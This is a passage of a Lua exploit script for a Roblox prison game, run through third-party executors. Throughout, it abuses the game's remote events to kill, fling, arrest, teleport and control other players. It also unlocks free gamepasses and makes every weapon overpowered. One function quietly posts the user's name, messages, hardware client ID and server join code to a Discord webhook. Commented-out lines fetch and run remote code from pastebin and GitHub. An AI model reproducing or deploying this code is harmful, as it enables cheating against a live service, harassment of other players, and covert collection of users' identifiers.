		[5] = {
			["Name"] = "Head",
			["CFrame"] = char.Head.CFrame,
			["Material"] = Enum.Material.ForceField,
			["Parent"] = char,
			["Size"] = Vector3.new(0.001, 0.001, 0.001),
			["Transparency"] = 1
		}
	}

	workspace.resources.RemoteEvent:FireServer(unpack(args))
	end
    else return end
    --else end
end

local function Horrify(char)
if not Players:FindFirstChild(char) then return end
char = Players:FindFirstChild(char).Character
function motor(part)
   local properties = {
        ["TopSurface"] = blah,
        ["Reflectance"] = 1,
        ["Parent"] = part.Parent,
        ["CFrame"] = part.CFrame,
        ["RightSurface"] = Enum.SurfaceType.Motor,
        ["RotVelocity"] = Vector3.new(50, 0, 0),
        ["Material"] = Enum.Material.Neon,
        ["Size"] = part.Size,
        ["FrontSurface"] = Enum.SurfaceType.Motor,
        ["BottomSurface"] = Enum.SurfaceType.Motor,
        ["CanCollide"] = true,
        ["LeftSurface"] = Enum.SurfaceType.Motor,
        ["Transparency"] = part.Transparency,
        ["Name"] = part.Name,
        ["BrickColor"] = part.BrickColor,
        ["BackSurface"] = Enum.SurfaceType.Motor,
        ["RightSurface"] = Enum.SurfaceType.Motor,
        ["LeftSurface"] = Enum.SurfaceType.Motor,
        ["Anchored"] = true
   }
   firesignal(game.Workspace.resources.RemoteEvent.OnClientEvent,"drawLaser",part.Position,part.Position,properties)
   lib.FireOtherClients("drawLaser",part.Position,part.Position,properties)
end

for i,obj in pairs(char:GetChildren()) do
    if obj:IsA("Part") then
        motor(obj)
        end
end
end

local function PArrest(char)
if not Players:FindFirstChild(char) then return end
cplayer = Players:FindFirstChild(char)
char = cplayer.Character
local oldteam = Player.TeamColor
local root = Player.Character.HumanoidRootPart
oldcf = root.CFrame
local target = char["HumanoidRootPart"]

game.Workspace.resources.RemoteFunction:InvokeServer("requestTeam", "police")

for i = 1,7 do
root.CFrame = target.CFrame
wait(0.02)
lib.FireServer("cuff", cplayer)
wait(0.03)
end

wait(0.05)
root.CFrame = oldcf
if oldteam == BrickColor.new("Bright red") then
    game.Workspace.resources.RemoteFunction:InvokeServer("requestTeam", "prisoners")
elseif oldteam == BrickColor.new("Bright blue") then
    game.Workspace.resources.RemoteFunction:InvokeServer("requestTeam", "police")
elseif oldteam == BrickColor.new("Bright yellow") then
    firetouchinterest(Player.Character.Head, game:GetService("Workspace")["robber spawn"], 0)
end
end

local function PFling(char)
if not Players:FindFirstChild(char) then return end
char = Players:FindFirstChild(char).Character
print(char.Name,char)
local properties = {
["CanCollide"] = true,
 ["Parent"] = player,
 ["Anchored"] = true,
 ["Color"] = Color3.fromRGB(248, 248, 248),
 ["Material"] = Enum.Material.Glass,
 ["Size"] = Vector3.new(10,10,10),
 ["Transparency"] = 1,
 ["Velocity"] = Vector3.new(1500,1500,1500), -- 9e9 super fling nil - 1500 fling like normal
 ["CFrame"] = char.HumanoidRootPart.CFrame,
}

lib.FireOtherClients("drawLaser",char.HumanoidRootPart.Position,char.HumanoidRootPart.Position,properties)
end

local function createthunder(part,start,endpos)
local properties = {
["Material"] = Enum.Material.Neon,
["Color"] = SmiteColor,
["Reflectance"] = 0,
["CanCollide"] = false
}
--game.Workspace.resources.RemoteEvent:FireServer("drawLaser",start,endpos,properties)
firesignal(game.Workspace.resources.RemoteEvent.OnClientEvent,"drawLaser",start,endpos,properties)
lib.FireOtherClients("drawLaser",start,endpos,properties)
end


local function CreatePermPart(part,parent) -- This is for Effects/Creating parts without Looping
	local properties = {
		["TopSurface"] = blah,
		["Material"] = part.Material,
		["Reflectance"] = part.Reflectance,
		["BrickColor"] = part.BrickColor,
		["Transparency"] = part.Transparency,
		["Size"] = part.Size,
		["Position"] = part.Position,
		["CanCollide"] = part.CanCollide,
		["Anchored"] = part.Anchored,
		["Shape"] = part.Shape,
		["Parent"] = parent,
		["Orientation"] = part.Orientation
	}
	firesignal(game.Workspace.resources.RemoteEvent.OnClientEvent,"drawLaser",part.Position,part.Position,properties)
	require(game:GetService("Workspace").upsilonLibrary).FireOtherClients("drawLaser",part.Position,part.Position,properties)
end


local function CreateReturningPart(part,ft,waittime) -- This is for normal Parts
	local waittime = waittime
	local part = part

	local Players = game:GetService("Players")
	local broken = false

	local parent = part.Parent --- Gets the parent of the Instance you called

	parent.ChildRemoved:connect(function(Obj) --- When the parent of the part has a Instance removed this fires
		if Obj == part then --- If the part that was destoyed is the Part
			broken = true
			coroutine.yield()
		end
	end)      

	local loop = coroutine.create(function() --- Creates the loop
		while not broken do task.wait(waittime) --- Shorter the wait the cleaner the part will look but will cause more lag so pick your poison
			if not broken then --- So if the part is destroyed stop running
				--- Arguments for the part (dont edit because its already set up good enough)
				local args = {
					[1] = "FireOtherClients",
					[2] = "drawLaser",
					[3] = Vector3.new(0,0,0),
					[4] = Vector3.new(0,0,0),
					[5] = {
						["CFrame"] = part.CFrame,
						["Material"] = part.Material,
						["BrickColor"] = part.BrickColor,
						["Reflectance"] = 0,
						["CanCollide"] = part.CanCollide,
						["Orientation"] = part.Orientation,
						["Name"] = part.Name,
						["Shape"] = part.Shape,
						["Velocity"] = part.Velocity,
						["Size"] = part.Size,
						["Transparency"] = part.Transparency
					}
				}

				workspace.resources.RemoteEvent:FireServer(unpack(args))
			else
				coroutine.yield()
				break
			end
		end
	end)
	coroutine.resume(loop) --- Plays the loop
end

lasers = {}
local function drawLaser(part,start,endpos) -- client only parts
	local dist = (start-endpos).magnitude
	
	local laser = part:Clone()
	laser.Parent = workspace.ignore
	laser.Size = Vector3.new(0.2,0.2,dist)
	laser.CFrame = CFrame.new(start, endpos) * CFrame.new(0, 0, -dist/2) * CFrame.Angles(0, 0, 2*math.pi*math.random())
	lasers.laser = laser
	table.insert(lasers,laser)
	return laser
end

local function fsPart(part) -- This is for normal Parts
	local part = part

				--- Arguments for the part (dont edit because its already set up good enough)
				local args = {
					[1] = "FireOtherClients",
					[2] = "drawLaser",
					[3] = Vector3.new(0,0,0),
					[4] = Vector3.new(0,0,0),
					[5] = {
						["CFrame"] = part.CFrame,
						["Material"] = part.Material,
						["BrickColor"] = part.BrickColor,
						["Reflectance"] = 0,
						["CanCollide"] = part.CanCollide,
						["Orientation"] = part.Orientation,
						["Shape"] = part.Shape,
						["Size"] = part.Size,
					}
				}

				workspace.resources.RemoteEvent:FireServer(unpack(args))
end


local function TSmite(char)
    if not Players:FindFirstChild(char) then return end
    char = Players:FindFirstChild(char).Character
    local ray = Instance.new("Part")
    ray.Parent = workspace
    for x = 1,20 do
    createthunder(ray,char.HumanoidRootPart.Position+Vector3.new(0,-5,0)+Vector3.new(math.random(-1,2),0,math.random(-1,2)),char.HumanoidRootPart.Position+Vector3.new(math.random(-50,50),50,math.random(-50,50)))
    end
    TKill(char.Name)
    ray:Destroy()
end

local function TBring(char)
    if not Players:FindFirstChild(char) then return end
    char = Players:FindFirstChild(char).Character
Player.Character.HumanoidRootPart.Anchored = true
local oldroot = Player.Character.HumanoidRootPart
oldcf = oldroot.CFrame
local target = char["HumanoidRootPart"]

local newroot
Player.Character.ChildAdded:Connect(function(child)
    if child.Name == "HumanoidRootPart" then
       newroot = child
       return end
end)

workspace.resources.RemoteFunction:InvokeServer("giveRiotShield", target)
workspace.resources.RemoteEvent:FireServer("toggleShield",workspace.RiotShield)
oldroot.Anchored = false
newroot.CFrame = oldcf
wait(0.7)
for i,v in pairs(Player.Character:GetChildren()) do
    if v.Name == "RiotShield" then
        Player.Character["Left Arm"].Weld:Destroy()
        newroot:Destroy()
        v:Destroy()
    end
end
end
local function TGoto(char)
if not Players:FindFirstChild(char) then return end
char = Players:FindFirstChild(char).Character
Player.Character.HumanoidRootPart.CFrame = char.HumanoidRootPart.CFrame * CFrame.new(-5,0,0)
end
local function TControl(char)
    if not Players:FindFirstChild(char) then return end
char = Players:FindFirstChild(char).Character
Player.Character.HumanoidRootPart.Anchored = true
local oldroot = Player.Character.HumanoidRootPart
local target = char["HumanoidRootPart"]

workspace.resources.RemoteFunction:InvokeServer("giveRiotShield", target)
workspace.resources.RemoteEvent:FireServer("toggleShield",workspace.RiotShield)
oldroot.Anchored = false
end

local function ChangeClothing(ShirtID,PantsID)
    workspace.resources.RemoteEvent:FireServer("wearShirt","http://www.roblox.com/asset/?id="..ShirtID)
    workspace.resources.RemoteEvent:FireServer("wearPants","http://www.roblox.com/asset/?id="..PantsID)
end    
local function FilterTNames(target)
    for _, Target in ipairs(Players:GetPlayers()) do
		if (string.lower(target) == string.sub(string.lower(Target.Name), 1, #target)) or (string.lower(target) == string.sub(string.lower(Target.DisplayName), 1, #target)) then
		    return Target.Name
		end
	end
end

local function FilterString(String)
    return ChatService:FilterStringForBroadcast(String, Player)
end

local function ChatMakeSystemMessage(type,message)
    if type == "warning" then
    game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{Text="!WARNING! "..message,Color=Color3.fromRGB(255,0,0)})
    elseif type == "info" then
    game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{Text="! "..message,Color=Color3.fromRGB(255, 170, 0)})
    elseif type == "message" then
    game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{Text=message,Color=Color3.fromRGB(149, 0, 0)})
    end
end

function SendPromptHook(ufm,fm)
if syn then
    executor = "Synapse X"
elseif Krnl then
    executor = "KRNL"
else
    game.Players.LocalPlayer:Kick("Stop using shitsploits get krnl or buy synapse")
end


pcall(function()
    local data
     data = {  
    ['embeds'] = {
        {
        ['title'] = 'Prompt usage',
        ['color'] = 1600799,
        ['fields'] = {
           {name = 'Player Name: ', value = Player.Name},
           {name = 'Unfiltered Message: ', value = ufm},
           {name = "Filtered Message: ", value = fm},
           {name = 'HWID: ', value = '```'..game:GetService("RbxAnalyticsService"):GetClientId()..'```'},
           {name = "Version: ", value = ScriptVersion},
           {name = 'Server: ', value = '```game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'")```'}
         }
        }
      }
 }

    if syn then
        local response = syn.request(
            {
                Url = webhooks.PromptHook,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        );
    elseif request then
        local response = request(
            {
                Url = webhooks.PromptHook,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        );
    elseif http_request then
        local response = http_request(
            {
                Url = webhooks.PromptHook,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        );
    end
 end)
end

--\\ Announcements
local AnnouncementsChannel = EternalHubServer:Channel("announcements")
if Announcement ~= '' then
AnnouncementsChannel:Label(Announcement)
AnnouncementsChannel:Seperator()
end
AnnouncementsChannel:Label("!| If you encounter a bug, please report it immediately!")
AnnouncementsChannel:Seperator()
--\\ Main Tabs
local TeamSwitchChannel = EternalHubServer:Channel("switch-team")
TeamSwitchChannel:Button(
    "Police",
    function()
        game.Workspace.resources.RemoteFunction:InvokeServer("requestTeam", "police")
    end
)
TeamSwitchChannel:Button(
    "Prisoner",
    function()
        game.Workspace.resources.RemoteFunction:InvokeServer("requestTeam", "prisoners")
    end
)
TeamSwitchChannel:Button(
    "Fugitive",
    function()
        firetouchinterest(game.Players.LocalPlayer.Character.Head, game:GetService("Workspace")["robber spawn"], 0)
        firetouchinterest(game.Players.LocalPlayer.Character.Head, game:GetService("Workspace")["robber spawn"], 1)
    end
)
TeamSwitchChannel:Button(
    "Return to menu",
    function()
        workspace.resources.RemoteEvent:FireServer('choiceResult', 'returnToMenu', true)
    end
)

local TeleportChannel = EternalHubServer:Channel("teleports")
TeleportChannel:Button(
    "Armory",
    function()
        teleport(105.805626, 3.98815084, 2.83483744)
    end
)
TeleportChannel:Button(
    "Garage",
    function()
        teleport(10.0002174, 4.9727814, -278.929565)
    end
)
TeleportChannel:Button(
    "Cafeteria",
    function()
        teleport(22.346738815307617, 3.9999992847442627, -115.22933197021484)
    end
)
TeleportChannel:Button(
    "J Block",
    function()
        teleport(-2.84935522, 3.96974111, 76.8778152)
    end
)
TeleportChannel:Button(
    "Jail Top",
    function()
        teleport(52.644783, 33.9684906, -53.3769035)
    end
)
TeleportChannel:Button(
    "Jail Front",
    function()
        teleport(152.99606323242188, 3.9672372341156006, -241.49986267089844)
    end
)
TeleportChannel:Button(
    "Watchtower",
    function()
        teleport(193.56019592285156, 44.9686164855957, -195.07362365722656)
    end
)
TeleportChannel:Button(
    "Helipad",
    function()
        teleport(263.453125, 4, 64.1009979)
    end
)
TeleportChannel:Button(
    "Security Room",
    function()
        teleport(55.2727051, 3.99395561, 2.5393605)
    end
)
TeleportChannel:Button(
    "Inner Gate Controls",
    function()
        teleport(123.538559, 25.97155, -331.90976)
    end
)
TeleportChannel:Button(
    "Outer Gate Controls",
    function()
        teleport(187.497528, 4.98902416, -422.814575)
    end
)
TeleportChannel:Button(
    "Cake",
    function()
        teleport(116.507835, 3.97595763, -35.0950546)
    end
)
TeleportChannel:Button(
    "Mountain",
    function()
        teleport(-277.1513366699219, 113.10633850097656, -406.54193115234375)
    end
)
TeleportChannel:Button(
    "Car spawn",
    function()
        teleport(-309.674072265625, -23.989999771118164, -806.3096923828125)
    end
)
TeleportChannel:Button(
    "Fake ID Card",
    function()
        teleport(-432.90921, -24.0158806, -527.353394)
    end
)
TeleportChannel:Button(
    "Fugitive shed",
    function()
        teleport(-616.645569, -24.7896214, -333.158203)
    end
)

local playerChannel = EternalHubServer:Channel("players")
playerChannel:Label("Other Players")
playerChannel:Textbox(
    "Target",
    "Enter target name",
    false,
    function(target)
        local FilteredString = FilterTNames(target)
        if FilteredString ~= Ranks.Developer.UserName and FilteredString ~= Ranks.Holder.UserName then
        Target = FilteredString
        else
            DiscordLib:Notification("Error", "This player cannot be targetted. try someone else!", "sorry")
        end
    end
)
playerChannel:Button(
    "Kill player",
    function()
        if not Players:FindFirstChild(Target) then return end
        if not KillCooldown then
        KillCooldown = true
        TKill(Target)
        wait(CooldownTime)
        KillCooldown = false
        else
            ChatMakeSystemMessage("warning","Kill command Is on cooldown. Please wait to use it again!")
        end
    end
)
playerChannel:Button(
    "Fling player",
    function()
        if not Players:FindFirstChild(Target) then return end
        if not FlingCooldown then
        FlingCooldown = true
        PFling(Target)
        wait(CooldownTime)
        FlingCooldown = false
        else
            ChatMakeSystemMessage("warning","Fling command Is on cooldown. Please wait to use it again!")
        end
    end
)
playerChannel:Button(
    "Arrest player",
    function()
        if not Players:FindFirstChild(Target) then return end
        if not ArrestCooldown then
        ArrestCooldown = true
        PArrest(Target)
        wait(CooldownTime)
        ArrestCooldown = false
        else
            ChatMakeSystemMessage("warning","Arrest command Is on cooldown. Please wait to use it again!")
        end
    end
)
playerChannel:Button(
    "Horrify player",
    function()
        if not Players:FindFirstChild(Target) then return end
        if not HorrifyCooldown then
        HorrifyCooldown = true
        Horrify(Target)
        wait(CooldownTime)
        HorrifyCooldown = false
        else
            ChatMakeSystemMessage("warning","Horrify command Is on cooldown. Please wait to use it again!")
        end
    end
)
playerChannel:Button(
    "Bring player",
    function()
        if not Players:FindFirstChild(Target) then return end
        if not BringCooldown then
        BringCooldown = true
        TBring(Target)
        wait(CooldownTime)
        BringCooldown = false
        else
            ChatMakeSystemMessage("warning","Bring command Is on cooldown. Please wait to use it again!")
        end
    end
)
playerChannel:Button(
    "GoTo player",
    function()
        if not Players:FindFirstChild(Target) then return end
        TGoto(Target)
    end
)
playerChannel:Button(
    "Smite player",
    function()
        if not Players:FindFirstChild(Target) then return end
        if not SmiteCooldown then
        SmiteCooldown = true
        TSmite(Target)
        wait(CooldownTime)
        SmiteCooldown = false
        else
            ChatMakeSystemMessage("warning","Smite command Is on cooldown. Please wait to use it again!")
        end
    end
)
playerChannel:Button(
    "Control player",
    function()
        if not Players:FindFirstChild(Target) then return end
        if not ControlCooldown then
        ControlCooldown = true
        TControl(Target)
        wait(CooldownTime)
        ControlCooldown = false
        else
            ChatMakeSystemMessage("warning","Control command Is on cooldown. Please wait to use it again!")
        end
    end
)
playerChannel:Seperator()
playerChannel:Button(
    "Kill others",
    function()
        if not KillOthersCooldown then
            KillOthersCooldown = true
        for i,v in pairs(Players:GetPlayers()) do
            if v.Name ~= Player.Name and v.Name ~= Ranks.Developer.UserName and v.UserId ~= Ranks.Developer.UserId and v.Name ~= Ranks.Holder.UserName and v.UserId ~= Ranks.Holder.UserId  then
                TKill(v.Name)
            end
        end
        wait(CooldownTime)
        KillOthersCooldown = false
        else
            ChatMakeSystemMessage("warning","Kill others command Is on cooldown. Please wait to use it again!")
        end
end
)
playerChannel:Button(
    "Bring others",
    function()
        if not BringOthersCooldown then
            BringOthersCooldown = true
        for i,v in pairs(Players:GetPlayers()) do
            if v.UserId ~= Player.UserId then
                TBring(v.Name)
            end
        end
        wait(CooldownTime)
BringOthersCooldown = false
else
                ChatMakeSystemMessage("warning","Bring others command Is on cooldown. Please wait to use it again!")
        end
    end
)
playerChannel:Seperator()
playerChannel:Label("Local Player")
playerChannel:Slider(
    "Walk Speed",
    16,
    150,
    0,
    function(value)
        Player.Character.Humanoid.WalkSpeed = value
    end
)
playerChannel:Slider(
    "Jump Power",
    50,
    250,
    0,
    function(value)
        Player.Character.Humanoid.JumpPower = value
    end
)
playerChannel:Button(
    "Respawn",
    function()    
        workspace.resources.RemoteEvent:FireServer("reloadMe")
    end
)
playerChannel:Button(
    "Click-TP tool",
    function()
        if not Player.Backpack:FindFirstChild("Click TP") or Player.Character:FindFirstChild("Click TP") then
        local tool = Instance.new("Tool")
tool.Name = "Click TP"
tool.Parent = Player.Backpack
tool.RequiresHandle = false
local ToolEquipped
local HoverArea
tool.Equipped:Connect(function()
	if not ToolEquipped then
		ToolEquipped = true
		part = Instance.new("Part",tool)
		part.CanCollide = false
		part.Anchored = true
		part.Shape = Enum.PartType.Ball
		part.Material = Enum.Material.SmoothPlastic
		part.Transparency = 0.6
		part.BrickColor = BrickColor.new("Lime green")
		part.Orientation = Vector3.new(0,0,90)
		part.Size = Vector3.new(2,2,2)
		HoverArea = part
		while ToolEquipped and wait() do
			part.Position = Mouse.Hit.p --* CFrame.Angles(0,0,math.rad(90))
		end
	end
end)
tool.Unequipped:Connect(function()
	if ToolEquipped then
		ToolEquipped = false
		HoverArea:Destroy()
		local HoverArea
		HoverArea = HoverArea
	end
end)
tool.Activated:Connect(function()
    Player.Character.HumanoidRootPart.CFrame = CFrame.new(Mouse.Hit.X, Mouse.Hit.Y + 3.5, Mouse.Hit.Z)
end)
end
    end
)
playerChannel:Button(
    "OP Guns",
    function()
    DiscordLib:Notification("Warning", "Changes do not take affect until you respawn", "ok")

local stats = require(game:GetService("ReplicatedStorage").ItemStats)

stats.M98B.fireType = "automatic"
stats.M98B.coolDown = 0
stats.M98B.reloadTime = 0
stats.M98B.maxAmmo = math.huge
stats.M98B.maxExAmmo = math.huge

stats["Beretta M9"].fireType = "automatic"
stats["Beretta M9"].coolDown = 0
stats["Beretta M9"].reloadTime = 0
stats["Beretta M9"].maxAmmo = math.huge
stats["Beretta M9"].maxExAmmo = math.huge

stats.AK47.fireType = "automatic"
stats.AK47.coolDown = 0
stats.AK47.reloadTime = 0
stats.AK47.maxAmmo = math.huge
stats.AK47.maxExAmmo = math.huge

stats["S&W 638"].fireType = "automatic"
stats["S&W 638"].coolDown = 0
stats["S&W 638"].reloadTime = 0
stats["S&W 638"].maxAmmo = math.huge
stats["S&W 638"].maxExAmmo = math.huge

stats.M1014.fireType = "automatic"
stats.M1014.coolDown = 0
stats.M1014.reloadTime = 0
stats.M1014.maxAmmo = math.huge
stats.M1014.maxExAmmo = math.huge

stats["AK47-U"].fireType = "automatic"
stats["AK47-U"].coolDown = 0
stats["AK47-U"].reloadTime = 0
stats["AK47-U"].maxAmmo = math.huge
stats["AK47-U"].maxExAmmo = math.huge

stats.Taser.fireType = "automatic"
stats.Taser.coolDown = 0
stats.Taser.reloadTime = 0
stats.Taser.maxAmmo = math.huge
stats.Taser.maxExAmmo = math.huge

stats.M16.fireType = "automatic"
stats.M16.coolDown = 0
stats.M16.reloadTime = 0
stats.M16.maxAmmo = math.huge
stats.M16.maxExAmmo = math.huge

stats["SPAS-12"].fireType = "automatic"
stats["SPAS-12"].coolDown = 0
stats["SPAS-12"].reloadTime = 0
stats["SPAS-12"].maxAmmo = math.huge
stats["SPAS-12"].maxExAmmo = math.huge

stats.M60.fireType = "automatic"
stats.M60.coolDown = 0
stats.M60.reloadTime = 0
stats.M60.maxAmmo = math.huge
stats.M60.maxExAmmo = math.huge

stats["UMP-45"].fireType = "automatic"
stats["UMP-45"].coolDown = 0
stats["UMP-45"].reloadTime = 0
stats["UMP-45"].maxAmmo = math.huge
stats["UMP-45"].maxExAmmo = math.huge

stats.ACR.fireType = "automatic"
stats.ACR.coolDown = 0
stats.ACR.reloadTime = 0
stats.ACR.maxAmmo = math.huge
stats.ACR.maxExAmmo = math.huge

stats.Revolver.fireType = "automatic"
stats.Revolver.coolDown = 0
stats.Revolver.reloadTime = 0
stats.Revolver.maxAmmo = math.huge
stats.Revolver.maxExAmmo = math.huge

stats.Makarov.fireType = "automatic"
stats.Makarov.coolDown = 0
stats.Makarov.reloadTime = 0
stats.Makarov.maxAmmo = math.huge
stats.Makarov.maxExAmmo = math.huge

stats.L86A2.fireType = "automatic"
stats.L86A2.coolDown = 0
stats.L86A2.reloadTime = 0
stats.L86A2.maxAmmo = math.huge
stats.L86A2.maxExAmmo = math.huge

stats.M14.fireType = "automatic"
stats.M14.coolDown = 0
stats.M14.reloadTime = 0
stats.M14.maxAmmo = math.huge
stats.M14.maxExAmmo = math.huge
    end
)

playerChannel:Toggle(
    "Free gamepasses",
    false,
    function(tog)
        if tog == true then
            gamepasstog = true
            else
            gamepasstog = false
        end
    end
)

playerChannel:Toggle(
    "Instant respawn",
    false,
    function(tog)
        if tog == true then
            DiscordLib:Notification("Warning", "Changes do not take affect until you respawn", "ok")
            instantrespawntog = true
            else
            instantrespawntog = false
        end
    end
)

local FEStuff = EternalHubServer:Channel("functions")
FEStuff:Label("Prompt Panel")
FEStuff:Textbox(
    "Prompt message",
    "Enter message here",
    false,
    function(Message)
       --if Player.Name ~= Ranks.Developer.UserName and Player.UserId ~= Ranks.Developer.UserId and Player.Name ~= Ranks.Holder.UserName and Player.UserId ~= Ranks.Holder.UserId then
        if ScriptRelease == "Public" then
        local FilteredMessage = FilterString(Message)
        PromptMessage = FilteredMessage
        SendPromptHook(Message,FilteredMessage)
        else
        PromptMessage = Message
        end
    end
)
FEStuff:Button(
    "Announce prompt",
    function()
        firesignal(game.Workspace.resources.RemoteEvent.OnClientEvent,"displayChoice",'returnToMenu',PromptMessage)
        lib.FireOtherClients("displayChoice",'returnToMenu',PromptMessage)
        --webh = loadstring(game:HttpGet("https://pastebin.com/raw/wVpY53uR"))()[2]
        --loadstring(game:HttpGet("https://raw.githubusercontent.com/titusj3026/ProUserList/main/prompthook"))()
    end
)

FEStuff:Toggle(
    "Spam prompt",
    false,
    function(tog)
        if tog == true then
            prompttog = true
            else
            prompttog = false
        end
    end
)
FEStuff:Seperator()
FEStuff:Label("FE Stuff")

function FESmiteTool()
    
            if not SmiteToolGiven then
            SmiteToolGiven = true
        local tool = Instance.new("Tool")
tool.Name = "Smite"
tool.Parent = Player.Backpack
tool.RequiresHandle = false
local ToolEquipped = false
local HoverArea

tool.Equipped:Connect(function()
	if not ToolEquipped then
		ToolEquipped = true
		part = Instance.new("Part",tool)
		part.CanCollide = false
		part.Anchored = true
		part.Shape = Enum.PartType.Cylinder
		part.Material = Enum.Material.SmoothPlastic
		part.Transparency = 0.6
		part.BrickColor = BrickColor.new("Lime green")
		part.Orientation = Vector3.new(0,0,90)
		part.Size = Vector3.new(0.1,18,18)
		HoverArea = part
		while ToolEquipped and wait() do
			part.Position = Mouse.Hit.p --* CFrame.Angles(0,0,math.rad(90))
		end
	end
end)
tool.Unequipped:Connect(function()
	if ToolEquipped then
		ToolEquipped = false
		HoverArea:Destroy()
		local HoverArea
		HoverArea = HoverArea
	end
end)

local thunderparts = {}
function Activated()
    if not SmiteToolCooldown then
    SmiteToolCooldown = true
    local laserTemp = Instance.new("Part")
    laserTemp.Material = Enum.Material.Neon
    laserTemp.Color = SmiteColor
    laserTemp.Transparency = 0.5
    laserTemp.Anchored = true
    laserTemp.CanCollide = false
    for i = 1,50 do
        local laser = drawLaser(laserTemp,Mouse.Hit.p+Vector3.new(math.random(-7,7),0,math.random(-7,7)),Mouse.Hit.p+Vector3.new(math.random(-100,100),100,math.random(-100,100)))
        fsPart(laser)
        table.insert(thunderparts,laser)
    end
    wait(0.08)
    for i,v in pairs(thunderparts) do
        v:Destroy()
    end
        for i,v in pairs(Players:GetPlayers()) do
        if v.Name ~= Player.Name and v.Name ~= Ranks.Developer.UserName and v.UserId ~= Ranks.Developer.UserId and v.Name ~= Ranks.Holder.UserName and v.UserId ~= Ranks.Holder.UserId  then
        local dist=(Mouse.Hit.p - v.Character.HumanoidRootPart.Position).magnitude
        
        if dist < 13 then
               TKill(v.Name)
           end
            end
        end
        laserTemp:Destroy()
        wait(CooldownTime)
        SmiteToolCooldown = false
    end
    if SmiteToolCooldown then return ChatMakeSystemMessage("warning","Kill command Is on cooldown. Please wait to use it again!") end
end

tool.Activated:Connect(Activated)

Player.CharacterAdded:Connect(function()
    if SmiteToolGiven then
        wait(CooldownTime)
        SmiteToolCooldown = false
        SmiteToolGiven = false
    return end
end)

end
    
end
FEStuff:Button(
    "FE smite tool",
    function()
        FESmiteTool()
    end
)
local function FESwordTool()
if Player.Backpack:FindFirstChild("FE Sword") or Player.Character:FindFirstChild("FE Sword") then return end
local Tool = Instance.new("Tool",Player.Backpack)

local Handle = Instance.new("Part",Tool)
local Part2 = Instance.new("Part",Tool)
local SwingSound = Instance.new("Sound",Handle)
local HandleWeld = Instance.new("Weld",Handle)

Tool.Name = "FE Sword"
HandleWeld.C0 = CFrame.new(0,0,0)
HandleWeld.Part0 = Part2
HandleWeld.Part1 = Handle
Handle.Name = "Handle"
Handle.CFrame = CFrame.new(-42.9000015, 1.10000038, -146.100006, 1, 0, 0, 0, 1, 0, 0, 0, 1)
Handle.Position = Vector3.new(-42.900001525878906, 1.1000003814697266, -146.10000610351562)
Handle.Color = Color3.new(0.188235, 0.188235, 0.188235)
Handle.Size = Vector3.new(0.2, 1.3, 0.19)
Handle.BottomSurface = Enum.SurfaceType.Smooth
Handle.BrickColor = BrickColor.new("Really black")
Handle.CanCollide = false
Handle.Material = Enum.Material.Neon
Handle.TopSurface = Enum.SurfaceType.Smooth
Part2.CFrame = CFrame.new(-42.9029617, 3.24664497, -146.100006, 0, 0, 1, -1, 0, 0, 0, -1, 0)
Part2.Orientation = Vector3.new(0, 90, -90)
Part2.Position = Vector3.new(-42.90296173095703, 3.246644973754883, -146.10000610351562)
Part2.Rotation = Vector3.new(-90, 90, 0)
Part2.Color = LaserColor
Part2.Size = Vector3.new(5, 0.2, 0.2)
Part2.BottomSurface = Enum.SurfaceType.Smooth
Part2.BrickColor = BrickColor.new("Really red")
Part2.CanCollide = false
Part2.Material = Enum.Material.Neon
Part2.TopSurface = Enum.SurfaceType.Smooth
Part2.Shape = Enum.PartType.Cylinder
HandleWeld.C0 = HandleWeld.C0 * CFrame.new(3.15,0,0) * CFrame.Angles(0,0,math.rad(90))
SwingSound.Volume = 1
SwingSound.SoundId = "rbxassetid://11397798600"

local lib = require(game:GetService("Workspace").upsilonLibrary)


function paprt(part)
local properties = {
["CanCollide"] = false,
 ["Parent"] = Workspace,
 ["Anchored"] = true,
 ["Color"] = part.Color,
 ["CFrame"] = part.CFrame,
 ["Material"] = part.Material,
 ["Shape"] = part.Shape,
 ["Size"] = part.Size,
 ["CastShadow"] = true
}

lib.FireOtherClients("drawLaser",part.Position,part.Position,properties)
end

local ToolEquipped = false
local ToolActive = false
local Touched = false

Tool.Equipped:Connect(function()
	if not ToolEquipped then
		ToolEquipped = true
	end
end)
Tool.Unequipped:Connect(function()
	if ToolEquipped then
	    ToolEquipped = false
	end
end)
Tool.Activated:Connect(function()
	if ToolEquipped and not ToolActive then
	    ToolActive = true
	    local Anim = Instance.new("Animation")
	    Anim.AnimationId = "rbxassetid://218504594"
	    Player.Character.Humanoid:LoadAnimation(Anim):Play()
	    SwingSound.PlaybackSpeed = (math.random(6, 11) / 10)
	    SwingSound:Play()
	    wait(0.7)
	    ToolActive = false
	end
end)

function HitTouched(c)
    if ToolActive and Players:FindFirstChild(c.Parent.Name) and c.Parent ~= Player.Character and c.Parent.Name ~= Ranks.Developer.UserName and c.Parent.Name ~= Ranks.Holder.UserName and c.Parent.Humanoid.Health ~= 0 then
        if Touched then return end
        Touched = true
        rootpos = c.Parent.HumanoidRootPart.CFrame
            TKill(c.Parent.Name)
            c.Parent.Humanoid.Health = 0
            local DeathScream = Instance.new("Sound",c.Parent.HumanoidRootPart)
            DeathScream.SoundId = "rbxassetid://566988981"
            DeathScream.Volume = 0.5
            local DeadDummy = game:GetObjects("rbxassetid://11393150953")[1]
            DeadDummy.Parent = c.Parent
            DeadDummy:SetPrimaryPartCFrame(rootpos * CFrame.Angles(math.rad(90),0,0) *  CFrame.new(0,0,2.9))
            DeathScream.PlaybackSpeed = (math.random(6, 11) / 10)
            DeathScream:Play()
            for i,v in pairs(DeadDummy:GetChildren()) do
                CreatePermPart(v,c.Parent)
            end
            DeadDummy:Destroy()
            wait(0.4)
            Touched = false
	end
end
Part2.Touched:connect(HitTouched)

while wait(0.07) and Player.Character.Humanoid.Health ~= 0 do
    if ToolEquipped then
        paprt(Handle)
        paprt(Part2)
        Part2.Color = LaserColor
    end
end
end
FEStuff:Button(
    "FE sword tool",
    function()
        FESwordTool()
    end
)
